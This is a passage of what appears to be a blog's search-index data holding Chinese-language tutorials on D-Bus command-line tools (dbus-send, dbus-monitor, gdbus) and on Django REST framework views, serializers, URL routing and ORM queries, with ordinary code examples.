必须始终指定要发送的消息的对象路径和名称。以下参数（如果有）是消息内容（消息参数）。这些值作为类型指定的值给出，可能包括如下所述的容器（数组、dict和变体）。\n支持参数 dbus-send 发送的消息，在调用方法需要传参数时，必须将这些值给出。dbus-send 支持传入的参数的类型，并不为D-Bus支持的所有的数据类型，仅为一些简单的类型：如\nType: 这里type 仅仅为简单的数据类型，即 type:content ,支持的内容如下： string | int16 | uint16 | int32 | uint32 | int64 | uint64 | double | byte | boolean | objpath。 数组：array = array:\u0026lt;type\u0026gt;:\u0026lt;value\u0026gt;[,\u0026lt;value\u0026gt;...] 词典: dict = dict:\u0026lt;type\u0026gt;:\u0026lt;type\u0026gt;:\u0026lt;key\u0026gt;,\u0026lt;value\u0026gt;[,\u0026lt;key\u0026gt;,\u0026lt;value\u0026gt;...]。 变体：variant = variant:\u0026lt;type\u0026gt;:\u0026lt;value\u0026gt;。 根据官网的解析出来后如上述集中数据类型，更详细的描述可以根据官方 dbus-send 进行参考。\n可以通过一张图来理解 dbus-send 发送一个消息所需的几个必须参数\n通过简单的命令，来了解一个 dbus-send 命令如何传入参数\ndbus-send --dest=org.freedesktop.ExampleName \\ # service /org/freedesktop/sample/object/name \\ # object org.freedesktop.ExampleInterface.ExampleMethod \\ # interface.method int32:47 string:'hello world' double:65.32\t\\ # param int array:string:\u0026quot;1st item\u0026quot;,\u0026quot;next item\u0026quot;,\u0026quot;last item\u0026quot; \\ # param array dict:string:int32:\u0026quot;one\u0026quot;,1,\u0026quot;two\u0026quot;,2,\u0026quot;three\u0026quot;,3 \\ # param dict variant:int32:-8 \\ # param variant objpath:/org/freedesktop/sample/object/name # param object_path 使用案例 如列出所有总线接口\ndbus-send --session \\ --dest=org.freedesktop.DBus \\ --type=method_call \\ --print-reply \\ /org/freedesktop/DBus \\ org.freedesktop.DBus.ListNames 查看对方总线所支持的对象接口，org.freedesktop.DBus.Introspectable 、org.freedesktop.DBus.Properties 和 org.freedesktop.PowerManagement。每个接口实现一些方法和信号。这些是你可以与之互动的东西。\ndbus-send --session \\ --type=method_call \\ --print-reply \\ --dest=org.freedesktop.DBus \\ / \\ org.freedesktop.DBus.Introspectable.Introspect dbus-send，也支持调用远程总线接口，通过默认通过 DBUS_SESSION_BUS_ADDRESS 或 DBUS_SYSTEM_BUS_ADDRESS，来指定远程的总线。\nDBUS_SESSION_BUS_ADDRESS=\u0026quot;\u0026quot; dbus-send --session \\ --type=method_call \\ --print-reply \\ --dest=org.freedesktop.DBus \\ / \\ org.freedesktop.DBus.Introspectable.Introspect dbus-monitor dbus-monitor 是一个可以监控 D-Bus 消息的命令行工具，。它可以调试和分析 D-Bus 通信间的数据包。\n监视所有消息 要在控制台上监视所有 D-Bus 消息，可以使用以下命令：\ndbus-monitor 监视某个特定接口 dbus-monitor interface=\u0026quot;org.freedesktop.NetworkManager\u0026quot; 监视某个特定路径下的对象 dbus-monitor path=\u0026quot;/org/freedesktop/NetworkManager\u0026quot; 监视某个特定接口和路径下的对象 dbus-monitor interface=\u0026quot;org.freedesktop.NetworkManager\u0026quot; \\ path=\u0026quot;/org/freedesktop/NetworkManager\u0026quot; 抓包输出到 Wireshark dbus-monitor --pcap \u0026gt; 1.pcap ​\ngdbus gdbus是 GLib实现的dbus工具。较与 dbus-send，拥有更完整的功能。\nintrospect : 可以打印出对象的接口和属性值。对应对象的所有者需要实现org.freedesktop.DBus.Introspectable 的接口。使用 --xml选项，将打印返回的xml 格式。--recurse 选项可将其子级等打印，--only 选项仅打印具有属性的接口。\nmonitor: 类似于 dbus-monitor\ncall: 调用一个方法，传入的必须为 GVariant ,而相应的也为GVariant。\nemit: 发出信号。信号中包含的每个参数除字符串外都必须序列化为GVariant。\n使用案例\ngdbus introspect --system \\ --dest org.freedesktop.UPower \\ --object-path \\ / \\ --recurse \\ --only-properties 通过call 来向一个dbus service发送信息\ngdbus call --session \\ --dest org.freedesktop.Notifications \\ --object-path /org/freedesktop/Notifications \\ --method org.freedesktop.Notifications.Notify \\ my_app_name \\ 42 \\ gtk-dialog-info \\ \u0026quot;The Summary\u0026quot; \\ \u0026quot;Here's the body of the notification\u0026quot; \\ [] \\ {} \\ 5000 (uint32 12,) 监听一个服务的对象\ngdbus monitor \\ --system \\ --dest org.freedesktop.NetworkManager \\ --object-path /org/freedesktop/NetworkManager/AccessPoint/4141 发送信号\ngdbus emit --session \\ --object-path /foo \\ --signal org.bar.Foo \u0026quot;['foo', 'bar', 'baz']\u0026quot; 想特定进程发送信号，`\u0026ndash;dest 为指定进程。\ngdbus emit \\ --session \\ --object-path /bar \\ --signal org.bar.Bar someString \\ --dest :1.42 检查配置文件语法 CentOS 7 (dbus 1.10)，命令会启动一个dbus来验证配置文件的正确与否\ndbus-launch --sh-syntax --config-file=/path/to/config \u0026gt; output.txt higher\ndbus-daemon --config-file=/path/to/config --print-syntax ","permalink":"https://www.oomkill.com/2021/10/dbus-client-tutorial/","summary":"","title":"Linux dbus命令行套件"},{"content":"What is Views drf提供了两个基类，五个视图扩展类，9个视图集\ndrf提供了一个Django中view的子类APIView ,主要变动大概为以下：\n重新封装了Request 与 Response实例。 使用了独有的Request与Response对象，并且提供了专有的解析器 Parser 可以根据HTTP Content-Type 指明的请求数据进行解析。 增加了自有的鉴权/节流 在django中dispatch() 分发前，会对请求进行身份认证、权限检查、流量控制。 异常捕获 APIException。 APIView implement\n@classmethod\rdef as_view(cls, **initkwargs):\r....\r# 调用父类的方法，Python 3 可以使用直接使用 super().xxx 代替 super(Class, self).xxx\rview = super(APIView, cls).as_view(**initkwargs)\rview.cls = cls\r# 并且生成一个新的request\rview.initkwargs = initkwargs\r# Note: session based authentication is explicitly CSRF validated,\r# all other authentication is CSRF exempt.\rreturn csrf_exempt(view)\r## 父类的view会执行dispatch分配为对应的handle memory，通过method获得对应的方法处理请求\rdef dispatch(self, request, *args, **kwargs):\r# Try to dispatch to the right method; if a method doesn't exist,\r# defer to the error handler. Also defer to the error handler if the\r# request method isn't on the approved list.\rif request.method.lower() in self.http_method_names:\rhandler = getattr(self, request.method.lower(), self.http_method_not_allowed)\relse:\rhandler = self.http_method_not_allowed\rreturn handler(request, *args, **kwargs)\rWhat is GenericAPIView GenericAPIView 是继承与 APIView的子类，在 APIView 的基础上增加了对于视图的通用支持方法，用来简化用户代码的编写。主要增加了 QuerySet 与 Serializers\nGenericAPIView implement\nclass GenericAPIView(views.APIView):\rqueryset = None\rserializer_class = None\rlookup_url_kwarg = None\rdef get_queryset(self):\r...\rassert self.queryset is not None, (\r\u0026quot;'%s' should either include a `queryset` attribute, \u0026quot;\r\u0026quot;or override the `get_queryset()` method.\u0026quot;\r% self.__class__.__name__\r)\rqueryset = self.queryset\rif isinstance(queryset, QuerySet):\r# Ensure queryset is re-evaluated on each request.\rqueryset = queryset.all()\rreturn queryset\rHow to Use Reference APIView\nGenericAPIView\n使用APIView与使用View类似，像往常一样，请求会根据不同的方法被dispatch到对应的处理逻辑方法，例如.get()or .post()\n引入\nfrom rest_framework.views import APIView\rfrom rest_framework.response import Response\r使用GenericAPIView 是 APIView 的子类，是实现了APIView 的常用行为的一个类。一般情况下会与引入\nqueryset：对象查询集，使用GenericAPIView 必须设置该属性，或者重写 get_queryset() 方法 serializer_class: 序列化器类，必须设置该属性或重写get_serializer_class()方法。 lookup_field: 查库时使用的条件字段，一般为传入的值，默认为pk pagination_class ：分页 from rest_framework import generics\rclass BookViewSet(generics.GenericAPIView):\rqueryset = Book.objects.all()\rserializer_class = BookModelSerializer\rdef get(self, request):\rbook_list = self.get_queryset()\rbook_serializers = self.get_serializer(book_list, many=True)\rreturn Response(book_serializers.data)\rdef delete(self, reques, pk):\rbook = self.get_object().delete()\rreturn Response({\u0026quot;message\u0026quot;:\u0026quot;success\u0026quot;, \u0026quot;status\u0026quot;:100})\r五个视图扩展 Mixin类：DRF提供的通用的增删改查行为，Mixin一般与generics.GenericAPI 混用，可以组成灵活的视图。\nCreateModelMixin: 保存新对象实例 创建成功返回201与序列化后的列表，失败则返回400与错误的详细信息 UpdateModelMixin ：对现有对象实例进行更新 与创建相同，成功返回200，失败返回400 DestroyModelMixin：删除对象实例 成功删除返回204 错误将返回一个404 ListModelMixin：列出实例列表 查询成功返回200，需要设置queryset，相应数据可以设置分页 RetrieveModelMixin: 只读操作单个对象 九个视图集 在路由确定用于请求的控制器之后，您的控制器负责理解请求并产生适当的输出。\n— Ruby on Rails 文档Django REST 框架允许您将一组相关视图的逻辑组\n视图集 ViewSet 是DRF基于view使用视图集ViewSet，可以将一系列逻辑相关的动作放到一个类中，如.get()或.post()则不在提供了，换为.list()和.create()的具体逻辑动作。\n","permalink":"https://www.oomkill.com/2021/10/python-django-restframework-view-set/","summary":"","title":"python drf之viewset"},{"content":"What is serializers？ serializers主要作用是将原生的Python数据类型（如 model querysets ）转换为web中通用的JSON，XML或其他内容类型。\nDRF 提供了一个Serializer类，它为您提供了种强大的通用方法来控制响应的输出，以及一个ModelSerializer 类，它为创建处理 model instance 和 serializers 提供了一个序列化的快捷方式。\nReference drf serializers manual\nHow to Declaring Serializers? 序列化一个django model\nclass Comment:\rdef __init__(self, email, content, created=None):\rself.email = email\rself.content = content\rself.created = created or datetime.now()\rcomment = Comment(email='leila@example.com', content='foo bar')\r声明Serializers，可以用来序列化与反序列化对象 Comment的属性及值。\nfrom rest_framework import serializers\rclass CommentSerializer(serializers.Serializer):\remail = serializers.EmailField() # 属性名称与类Comment名校相同\rcontent = serializers.CharField(max_length=200)\rcreated = serializers.DateTimeField()\r序列化及反序列化 序列化 from rest_framework import serializers\rclass CommentSerializer(serializers.Serializer):\remail = serializers.EmailField()\rcontent = serializers.CharField(max_length=200)\rcreated = serializers.DateTimeField()\r# 上面类似于如下python中的操作\rfrom rest_framework.renderers import JSONRenderer\rjson = JSONRenderer().render(serializer.data)\rjson\r# b'{\u0026quot;email\u0026quot;:\u0026quot;leila@example.com\u0026quot;,\u0026quot;content\u0026quot;:\u0026quot;foo bar\u0026quot;,\u0026quot;created\u0026quot;:\u0026quot;2016-01-27T15:17:10.375877\u0026quot;}'\r反序列化 反序列化是将json数据流解析为python的数据类型，后映射至对象\nimport io\rfrom rest_framework.parsers import JSONParser\rstream = io.BytesIO(json)\rdata = JSONParser().parse(stream)\rserializer = CommentSerializer(data=data)\rserializer.is_valid()\r# True\rserializer.validated_data\r# {'content': 'foo bar', 'email': 'leila@example.com', 'created': datetime.datetime(2012, 08, 22, 16, 20, 09, 822243)}\r数据的落地 如果需要对经过认证的数据进行保存入库，需要实现对应 serializer的 create() 和 update() 方法\nclass CommentSerializer(serializers.Serializer):\remail = serializers.EmailField()\rcontent = serializers.CharField(max_length=200)\rcreated = serializers.DateTimeField()\rdef create(self, validated_data): # validate_data 实际与 Comment一致，打散后为\rreturn Comment(**validated_data)\rdef update(self, instance, validated_data): # drf serializer实现了对应的实例，instance是该serializer，vilidated是对应的属性\rinstance.email = validated_data.get('email', instance.email)\rinstance.content = validated_data.get('content', instance.content)\rinstance.created = validated_data.get('created', instance.created)\rreturn instance\rserializer = CommentSerializer(data={'email': 'foobar', 'content': 'baz'})\rserializer.is_valid()\r# False\rserializer.errors\r# {'email': ['Enter a valid e-mail address.'], 'created': ['This field is required.']}\rsave() save() 可以创建或更新一个实例（实例是值库中的行）。\n# .save() will create a new instance.\rserializer = CommentSerializer(data=data)\r# .save() will update the existing `comment` instance.\rserializer = CommentSerializer(comment, data=data)\rHow to Use validate? validate是值在反序列化数据时，需要对数据进行验证（如，长度，值，类型），即在数据落地前，对其制定的规则进行验证。\nserializer = CommentSerializer(data={'email': 'foobar', 'content': 'baz'})\rserializer.is_valid()\r# False\rserializer.errors\r# {'email': ['Enter a valid e-mail address.'], 'created': ['This field is required.']}\r.is_valid() 是对数据的验证。raise_exception 是一个可选参数，如果 serializers.ValidationError如果存在验证错误，将引发异常。异常由 REST framework 提供的默认异常处理程序自动处理，并HTTP 400 Bad Request默认返回响应。\n# Return a 400 response if the data was invalid.\rserializer.is_valid(raise_exception=True)\r字段的验证 自定义验证 单字段验证\n通过子类 .validate_\u0026lt;field_name\u0026gt; 方法进行自定义验证方式，该方法需要返回验证的值或触发serializers.ValidationError. 例如：\nfrom rest_framework import serializers\rclass BlogPostSerializer(serializers.Serializer):\rtitle = serializers.CharField(max_length=100)\rcontent = serializers.CharField()\rdef validate_title(self, value):\r\u0026quot;\u0026quot;\u0026quot;\rCheck that the blog post is about Django.\r\u0026quot;\u0026quot;\u0026quot;\rif 'django' not in value.lower():\rraise serializers.ValidationError(\u0026quot;Blog post is not about Django\u0026quot;)\rreturn value\r类级别验证\n如果需要对多个字段进行验证验证，需要在类中实现validate() 方法。该方法仅单个参数 data, 为验证的字段的字典。例如\nfrom rest_framework import serializers\rclass EventSerializer(serializers.Serializer):\rdescription = serializers.CharField(max_length=100)\rstart = serializers.DateTimeField()\rfinish = serializers.DateTimeField()\rdef validate(self, data):\r\u0026quot;\u0026quot;\u0026quot;\rCheck that start is before finish.\r\u0026quot;\u0026quot;\u0026quot;\rif data['start'] \u0026gt; data['finish']:\rraise serializers.ValidationError(\u0026quot;finish must occur after start\u0026quot;)\rreturn data\r忽略验证 注意：如在Serializer 的\u0026lt;field_name\u0026gt; 声明了参数required=False 则该字段不会进行验证。\n指定验证器 Serializer 的\u0026lt;field_name\u0026gt; 还可以声明 validator，例如，\ndef multiple_of_ten(value):\rif value % 10 != 0:\rraise serializers.ValidationError('Not a multiple of ten')\rclass GameRecord(serializers.Serializer):\rscore = IntegerField(validators=[multiple_of_ten])\r...\rvalidator Reference\nvalidator\nModelSerializer ModelSerializer，是drf为了方便实现好的可以直接用的Serializer。实现为：\n将根据模型自动为您生成一组字段。 将自动为Serializer程序生成validator，例如 unique_together 验证器。 包括简单的实现默认的.create()和.update()。 ModelSerializer的声明 class AccountSerializer(serializers.ModelSerializer):\rclass Meta:\rmodel = Account\rfields = ['id', 'account_name', 'users', 'created']\rMeta的说明 Meta 类，如名称可知，这是设置Serializer的一些元数据。包含Model,Filed, Validator等信息，例如声明一个Meta类。\nclass EventSerializer(serializers.Serializer):\rname = serializers.CharField()\rroom_number = serializers.IntegerField(choices=[101, 102, 103, 201])\rdate = serializers.DateField()\rclass Meta:\r# 通过在内部Meta类中声明validators来包含，如下所示：\rvalidators = [\rUniqueTogetherValidator(\rqueryset=Event.objects.all(),\rfields=['room_number', 'date']\r)\r]\r# 通过在内部Meta类中声明model来包含对应使用model，如下所示：\rmodel = User\r# fields 可以指定要序列化的字段，'__all__'为model中的所有字段\rfields = ['username', 'email', 'profile']\rexclude=['username'] # exclude是要排除的字段\r注：从 3.3.0 版开始，必须提供以下属性之一fields或exclude.\nSerializer会在Meta中拿取自己对应的属性进行使用，例如\nmeta = getattr(self, 'Meta', None)\rvalidators = getattr(meta, 'validators', None)\r# assert \u0026lt;condition\u0026gt;,(..error message)\r# 可以看到Meta和Meta.model必须要设置\rassert hasattr(self, 'Meta'), (\r'Class {serializer_class} missing \u0026quot;Meta\u0026quot; attribute'.format(\rserializer_class=self.__class__.__name__\r)\r)\rassert hasattr(self.Meta, 'model'), (\r'Class {serializer_class} missing \u0026quot;Meta.model\u0026quot; attribute'.format(\rserializer_class=self.__class__.__name__\r)\r)\rif model_meta.is_abstract_model(self.Meta.model):\rraise ValueError(\r'Cannot use ModelSerializer with Abstract Models.'\r)\r其他用法 设置只读字段：字段属性中添加 read_only=True, 或者在Meta类中添加属性 中指定字段 read_only_fields 为列表。\nreadonly-field\nSerializer的字段与字段属性属性 Reference\nfields\n字段属性 read_only 在创建或更新时改属性True字段都被忽略 write_only 仅为创建或更新时使用，序列化时不操作该字段 required 默认情况下，在反序列化时未提供字段会引发错误，如果不需要可以设置为False source： 用于序列化时，填充替代对应字段名称的作用 URLField(source='get_absolute_url') 可以跨表 可以执行对象内方法。 Many: 可以返回多个对象，而非一个，在objects.all时使用 字段类型 BooleanField() CharField(max_length=None, min_length=None, allow_blank=False, trim_whitespace=True) 文本字段 EmailField(max_length=None, min_length=None, allow_blank=False) email字段 RegexField(regex, max_length=None, min_length=None, allow_blank=False) 正则表达式 IPAddressField(protocol='both', unpack_ipv4=False, **options) IP地址 SerializerMethodField(method_name=None) 通过方法序列化，只读字段 method_name 序列化时通过方法的名称。默认为get_\u0026lt;field_name\u0026gt;. ","permalink":"https://www.oomkill.com/2021/10/python-django-restframework-serializers/","summary":"","title":"python drf之Serializer"},{"content":"路由匹配 django中默认匹配页 url(r'^$', views.login),\rdjango中404匹配 url(r'^$', views.login), # 需要放置最后，不过一般不推荐，都是通过异常捕获处理\rnamed group 名称组 https://docs.djangoproject.com/en/1.11/topics/http/urls/#named-groups\nurl(r'^test[0-9]{4}',views.login) 反向解析 别名不能出现冲突\nfrom django.shortcuts import reverse\rreverse(xxx)\r名称组反向解析 无名分组\n# 路由部分\rurl(r'^index/(\\d+)/', views.home, name='xxx') # 前端\r\u0026lt;a href=\u0026quot;{% url 'id' obj.id %}\u0026quot; class=\u0026quot;btn btn-primary btn-xs\u0026quot;\u0026gt;remove\u0026lt;/a\u0026gt;s\r# 后端\rprint reverse('id', args=(id,))\r有名称分组\n# 路由部分\rurl(r\u0026quot;^userdel/(?P\u0026lt;id\u0026gt;\\d+)/\u0026quot;,views.UserDelete, name='id'),\r# 前端\r\u0026lt;a href=\u0026quot;{% url 'id' obj.id %}\u0026quot; class=\u0026quot;btn btn-primary btn-xs\u0026quot;\u0026gt;remove\u0026lt;/a\u0026gt;\r# or\r\u0026lt;a href=\u0026quot;{% url 'id' id=obj.id %}\u0026quot; class=\u0026quot;btn btn-primary btn-xs\u0026quot;\u0026gt;remove\u0026lt;/a\u0026gt;s\r# 后端\rprint reverse('id', kwargs={\u0026quot;id\u0026quot;:id})\r路由分发 路由分发中，并不能识别出，名称分组并不能准确识别出对应的分组，这里需要增加namespace概念\nfrom django.conf.urls import url, include\rfrom django.contrib import admin\rfrom memberserver import urls as member_urls\rurlpatterns = [\rurl(r'member', include(member_urls)),\r]\r路由分发中，并不能识别出，名称分组并不能准确识别出对应的分组，这里需要增加namespace概念\nfrom django.conf.urls import url, include\rfrom django.contrib import admin\rfrom memberserver import urls as member_urls\rurlpatterns = [\rurl(r'member', include(member_urls, namespace=\u0026quot;member\u0026quot;)),\r]\r# 在后端映射可以使用\rreverse(\u0026quot;member:id\u0026quot;) ## 来获得对应的路由\r# 在前端可以使用 来获得对应的路由\r{% url 'id' id=obj.id %}\r伪静态\n虚拟环境\n","permalink":"https://www.oomkill.com/2021/10/python-django/","summary":"","title":"python django使用"},{"content":"https://www.cnblogs.com/Dominic-Ji/p/11516152.html\n对象关系映射（Object Relational Mapping，简称ORM）模式是一种为了解决面向对象与关系数据库存在的互不匹配的现象的技术。\n简单的说，ORM是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。\nORM在业务逻辑层和数据库层之间充当了桥梁的作用。\ndjango中仅测试ORM 导入model，然后直接使用对应对象进行ORM操作。\nimport os\rif __name__ == \u0026quot;__main__\u0026quot;:\ros.environ.setdefault(\u0026quot;DJANGO_SETTINGS_MODULE\u0026quot;, \u0026quot;app.settings\u0026quot;)\rimport django\rdjango.setup()\rfrom xxx import models\rmodels.User.objects.all()\r连接数据库 django配置数据库\nDATABASES = {\r'default': {\r'ENGINE': 'django.db.backends.mysql',\r'USER': 'root',\r'PASSWORD': '111',\r'HOST':'127.0.0.1',\r'NAME': 'book',\r'CHARSET': 'utf8'\r}\r}\r可选：pymysql 使用模块连接MySQL数据库:：在项目中__init__.py 文件中添加配置：\nimport pymysql\rpymysql.install_as_MySQLdb()\r创建（表）对象 ORM中，O (Object) 代表\u0026quot;对象\u0026quot;，而R(Relational) 则代表\u0026quot;关系\u0026quot;。所以创建表即创建一个类，字段则是类的属性。类的每个实例则对应表中的一条记录。\n在Django中model就是你数据来源。通常，一个model映射到一个数据库表，一般情况下基本满足：\n每个model（表）都是一个Python类，它是django.db.models.Model的子类即继承models.Model。\n类的每个属性都代表一个字段（字段）。\n实例化出的对象，代表表中的记录。\n例如\nclass User(models.Model):\rname = models.CharField(max_length=32)\rage = models.IntegerField()\rregistration_time = models.DateField()\r字段类型 Reference 字段类型说明\n字段选项说明\n必需掌握字段类型说明：\nBigIntegerField or BigAutoField: 1~9223372036854775807 的64位自增int\nCharField: 用于存储字符串，对应MySQL中varchar\nDateField: python中的datetime.date.today() 即 Y-m-d\nDateTimeField：timezone.now - django.utils.timezone.now()为YYYY-MM-DD HH:MM[:ss[.uuuuuu]][TZ]，相当于Python中的datetime.datetime()\nDecimalField：小数，使用：models.DecimalField(..., max_digits=5, decimal_places=2)\nBooleanField: 代表一个true/false的布尔值。\nAutoField: int类型的自增列，必须填入参数primary_key=True 。当model中如果没有自增列，则自动会创建一个列名为id的列。\n字段参数 Reference\n字段选项说明\n必须掌握的字段选项：\nnull：表示该字段是否允许空值，如果为true，django将在数据库中将空值存储为null。默认为false。使用：models.CharField(null=True) db_index：是否对字段创建索引，如果为true，将为此字段创建数据库索引。 default：字段的默认值。这可以是值或可调用的对象。如果可调用它将每次创建新对象时调用它。 primary_key：primary_key=True，该字段为主键。 时间字段特殊参数：\nauto_now_add: auto_now_add=True，仅在创建对象时将当前时间插入到数据库中。如果不设置 auto_now: auto_now=True，每次更新数据记录的时候会更新该字段。 增 save() Python对象中表示数据库表数据，模型类表示数据库表，该类的实例表示数据库表中的记录。\n要创建一个对象，然后调用save()将其保存到数据库中。\nsave() 直到调用时，才操作数据库，并且没有返回值。\nsave() 必须实例化后调用\nb = models.User(name=\u0026quot;zhangsan\u0026quot;,age=18)\rb.save()\rcreate() 创建对象并且保存\nmodels.User.objects.create(name=\u0026quot;lisi\u0026quot;, age=19)\r删 delete() delete() 在查询集中的所有行上执行SQL DELETE，并返回删除的对象数量和每个对象类型的删除次数的字典。\ndelete()无法对QuerySet 上调用delete()\nmodels.User.objects.filter(pk=1).delete()\r查 查询必会的方法 返回值为QuerySet对象的方法有\nall() 查询所有数据 filter() 带有过滤条件的查询 exclude() 排除数据，exclude('xxx=xxx') order_by() 排序 降序 models.User.objects.order_by('-age') reverse() 反转，反转的数据必须是 order_by()后的数据 distinct() 去重，主键是唯一值，需要过滤主键\n返回值为特殊的QuerySet\nvalues() 返回一个可迭代的字典序列。（列表套字典） values_list() 返回一个可迭代的元祖序列。（列表套QuerySet）\n返回值为具体对象\nget() first() last()\n返回值布尔值：\nexists()\n返回值为数字\ncount() 统计当前数据个数\ndjango 查看原生SQL的方法 ``QuerySet 可以使用models.User.objects.values_list().query`\n终端打印，在setting.py中配置下列\nLOGGING = {\r'version': 1,\r'disable_existing_loggers': False,\r'handlers': {\r'console':{\r'level':'DEBUG',\r'class':'logging.StreamHandler',\r},\r},\r'loggers': {\r'django.db.backends': {\r'handlers': ['console'],\r'propagate': True,\r'level':'DEBUG',\r},\r}\r}\r条件查询 基于双下划线的查询 查询大于的18的用户 models.User.objects.filter(age__gt=12)\n查询年龄为18,19,20岁的用户 models.User.objects.filter(age__in=[18,19,20])\n查询90后用户 models.User.objects.filter(age__range=[22,31])\n模糊查询：查询名字包含l 的用户：models.User.objects.filter(name__contains='li')\n模糊查询：忽略大小写查询：models.User.objects.filter(name__icontains='li') 查询注册时间为 2020 7月份数据：models.User.objects.filter(registration_time__month=7)\n多表操作 在django中外键的存在使得ORM框架在处理表关系的时候异常的强大。在Django中，外键类定义为：class ForeignKey(to,on_delete,**options) 。可以看到外键的参数大致分为：\nto：引用那个model（表）。 on_delete：当使用了外键引用model（表）的数据被删除后的操作。 定义一个外键：\n在关系数据库中外键的作用是在于将表彼此关联起来。Django提供了定义三种最常见的数据库关系类型的方法：多对一、多对多和一对一。\n而关系型字段分为：\n关系型字段 对应关系 ForeignKey 多对一 ManyToManyField 多对多 OneToOneField 一对一 如下：\n一个作者可以写多本书，但一本书只能由一个出版社出版，使用 ForeignKey 可以直接使用Book实例中通过 Press 属性来操作对应的Press模型。 一本书 可以由多个 Author 编写，也可以由一个作者 Author 编写，但一个作者( Author)也可以编写多本书 Book。 一般情况下，出版社仅记录Author的一个联系方式，也就是 Author 与 AuthorDetail 为一对一关系。 class Book(models.Model):\rtitle = models.CharField(max_length=32)\rprice = models.DecimalField(max_digits=5, decimal_places=2)\rpublishData = models.DateField(auto_now_add=True)\rpress = models.ForeignKey(to=\u0026quot;Press\u0026quot;)\rauthor = models.ManyToManyField(to=\u0026quot;Author\u0026quot;)\rclass Press(models.Model):\rname = models.CharField(max_length=32,null=True)\raddress = models.CharField(max_length=32)\remail = models.EmailField()\rclass Author(models.Model):\rname = models.CharField(max_length=32,null=True)\rage = models.IntegerField()\rauthorDetail = models.OneToOneField(to=\u0026quot;AuthorDetail\u0026quot;)\rclass AuthorDetail(models.Model):\rphoneNumber = models.BigIntegerField()\raddress = models.CharField(max_length=32)\r外键的基本操作 添加外键关系：\nbookobj = models.Book.objects.filter(pk=1).first()\rbookobj.author.add(1) # 给主键为1的书籍绑定一个主键1的作者\rbookobj.author.add([1,2,3]) # 给主键为1的书籍绑定多个作者\r移除关系：bookobj.author.remove(1)\n修改关系：bookobj.author.set(2)\n清空该关系：bookobj.author.clear() # 清除所有这个作者的书\n正反向概念 正向查询：在子表中，查询父表（外键所在表）的信息 反向查询：通过父表，查询子表的信息\n多表查询 查询口诀：正向查询按外键字段，反向查询按表名（model）\nall() 当结果为多个时，需要使用.all() 如多对多，一对多\n查询书籍1的出版社 正向查询\nbook = models.Book.objects.filter(pk=1).first()\rprint book.press.name\r查询书籍1的作者 正向查询\nbook = models.Book.objects.filter(pk=1).first()\rprint book.author.all()\r查询作者1的电话\nauther = models.Author.objects.filter(pk=1).first()\rprint auther.authorDetail.phoneNumber\r查询出版社拥有的书 反向查询\npress = models.Press.objects.filter(pk=1).first()\rbooks = press.book_set.all()\r查询作者Phoenix写的书\nauther = models.Author.objects.filter(name=\u0026quot;Phoenix\u0026quot;).first()\rprint auther.book_set.all()\r根据手机号查询作者\nphone = models.AuthorDetail.objects.filter(phoneNumber=1511111111).first()\rprint phone.author.name\r基于下划线的查询 根据名称查询手机号\nmodels.Author.objects.filter(name=\u0026quot;Phoenix\u0026quot;).values(\u0026quot;authorDetail__phoneNumber\u0026quot;)\r# 获取两个表中的字段\rmodels.Author.objects.filter(name=\u0026quot;Phoenix\u0026quot;).values(\u0026quot;authorDetail__phoneNumber\u0026quot;,\u0026quot;name\u0026quot;)\r查询书籍1的作者名称\n# 正向\rmodels.Book.objects.filter(pk=1).values(\u0026quot;author__name\u0026quot;)\r# 反向\rmodels.AuthorDetail.objects.filter(author__name=\u0026quot;Phoenix\u0026quot;).values(\u0026quot;phoneNumber\u0026quot;,\u0026quot;author__name\u0026quot;)\r查询书籍1的作者手机号\nmodels.Book.objects.filter(pk=1).values(\u0026quot;author__authorDetail__phoneNumber\u0026quot;)\r聚合查询 (aggregate) aggregate() 是 QuerySet 的一个终止子句，意思是说，它返回一个包含一些键值对的字典。键的名称是聚合值的标识符，值是计算出来的聚合值。键的名称是按照字段和聚合函数的名称自动生成出来的。\n使用聚合查询需要引入具体的类 from django.db.models import Avg,Max,Min,Count,Sum\n获取书的总数 Book.objects.count()\n对数据进行聚合查询：aggregate(别名 = 聚合函数名[avg,max..](\u0026quot;属性名称\u0026quot;))\n分组查询（annotate） 分组查询一般会与聚合函数一起使用，使用前也许引入具体类：from django.db.models import Avg,Max,Min,Count,Sum\n返回值：\n分组后，用 values 取值，则返回值是 QuerySet 数据类型里面为一个个字典； 分组后，用 values_list 取值，则返回值是 QuerySet 数据类型里面为一个个元组。 分组位置 annotate：\nvalues or values_list 在 annotate 前：values 或者 values_list 是声明以什么字段分组，annotate 执行分组。 values or values_list 在annotate后： annotate 表示直接以当前表的pk执行分组，values 或者 values_list 表示查询哪些字段， 并且要将 annotate 里的聚合函数起别名，在 values 或者 values_list 里写其别名。 统计每本书的作者有几个\nmodels.Book.objects.annotate(autherNum=Count('author__id')).values('autherNum','title')\r统计出版社最便宜书的价格\nmodels.Press.objects.annotate(minPrice=Min('book__price')).values(\u0026quot;name\u0026quot;, \u0026quot;minPrice\u0026quot;)\r统计不止一个作者的书\nmodels.Book.objects.annotate(autherCount=Count(\u0026quot;author__id\u0026quot;)).filter(autherCount__gt=1).values(\u0026quot;title\u0026quot;,\u0026quot;autherCount\u0026quot;)\r统计作者出书的总价\nmodels.Author.objects.annotate(bookPrice=Sum(\u0026quot;book__price\u0026quot;)).values(\u0026quot;name\u0026quot;,\u0026quot;bookPrice\u0026quot;)\r根据指定字段分组\nF\u0026amp;Q查询 F查询 F 可以在对Model字段值的转换时，无需从数据库中将值加载到内存中，进行操作后再save()。\n例如。通常情况下，在更新数据时需先从数据库里将原数据加载到内存里，编辑后最后提交。\norder = Order.objects.get(orderid='1')\rorder.amount += 1\rorder.save()\r而F 可以直接对值进行运行而不必将数据从库中拉到内存中。例如\n卖出大于库存的书籍\nmodels.Book.objects.filter(sell__gt=F('stock'))\r对所有书籍价格增加100\nmodels.Book.objects.update(price=F('price')+100)\rQ查询 ORM filter() 等方法中的关键字参数查询都是一起进行 AND 的。 如需要执行更复杂的查询（例如OR语句），你可以使用Q对象。\nQ是对查询条件进行字符串拼接，故可以组合 \u0026amp; 和| 等操作符以及使用括号进行分组来编写任意复杂的Q对象。同时，Q 对象可以使用~ 操作符取反。\nQ 对象允许组合正常的查询和取反(NOT) 查询。\n如**：查询作者是的Radamandis和Phoenix**\nmodels.Book.objects.filter(Q(authors__name=\u0026quot;Phoenix\u0026quot;)|Q(authors__name=\u0026quot;Radamandis\u0026quot;))\r查询作者不是Phoenix的书\nmodels.Book.objects.filter(~Q(author__name=\u0026quot;Phoenix\u0026quot;))\r也可以进行组合查询: 